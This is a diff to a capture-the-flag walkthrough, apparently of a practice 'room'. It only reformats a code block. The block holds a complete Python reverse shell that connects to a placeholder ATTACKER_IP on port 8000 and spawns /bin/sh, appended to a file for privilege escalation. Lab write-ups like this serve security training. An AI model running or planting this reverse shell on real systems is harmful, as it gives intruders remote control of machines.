@@ -214,13 +214,15 @@ Let's take a look at the file
 
 Ok, let's append python reverse shell there and wait for 2 minutes.
 
-    import socket,os,pty;
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-    s.connect(("ATTACKER_IP",8000));
-    os.dup2(s.fileno(),0);
-    os.dup2(s.fileno(),1);
-    os.dup2(s.fileno(),2);
-    pty.spawn("/bin/sh");
+```python
+import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("ATTACKER_IP",8000));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/sh");
+```
 
 That's it! Frankly, privilege escalation was the easiest part of this room.
 
